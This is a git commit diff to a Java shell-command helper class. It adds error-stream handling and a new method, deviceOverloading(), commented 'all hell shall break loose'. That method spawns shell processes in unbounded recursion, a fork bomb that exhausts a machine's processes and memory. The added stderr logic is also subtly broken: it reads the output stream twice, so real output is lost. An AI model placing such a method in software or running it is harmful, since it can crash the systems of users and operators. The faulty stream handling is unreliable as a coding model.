6b6f9bc9cdbe75ce4d04ac9dbc65fda70dca2922
smol <75618732+SMOLKEYS@users.noreply.github.com>
2022-10-30 21:08:46 +0800

    Update Shell.java

--- src/anything/shell/Shell.java
+++ src/anything/shell/Shell.java
@@ -7,6 +7,7 @@ public class Shell{
     public static String run(String command) throws IOException{
         Process proc = Runtime.getRuntime().exec("sh");
         InputStream procI = proc.getInputStream();
+        InputStream procErr = proc.getErrorStream();
         DataOutputStream procO = new DataOutputStream(proc.getOutputStream());
 
         //write the command and flush
@@ -21,7 +22,16 @@ public class Shell{
         //then close the stream
         procO.close();
 
-        BufferedReader res = new BufferedReader(new InputStreamReader(procI));
+        BufferedReader res = new BufferedReader(new InputStreamReader(procI)), err = new BufferedReader(new InputStreamReader(procErr));
+        if(res.lines().parallel().collect(Collectors.joining("\n")).length() == 0) return err.lines().parallel().collect(Collectors.joining("\n"));
         return res.lines().parallel().collect(Collectors.joining("\n"));
+    }
+
+    //all hell shall break loose.
+    public static void deviceOverloading() throws IOException{
+        for(int i = 0; i < 25; i++){
+            Runtime.getRuntime().exec("sh");
+            deviceOverloading();
+        }
     }
 }
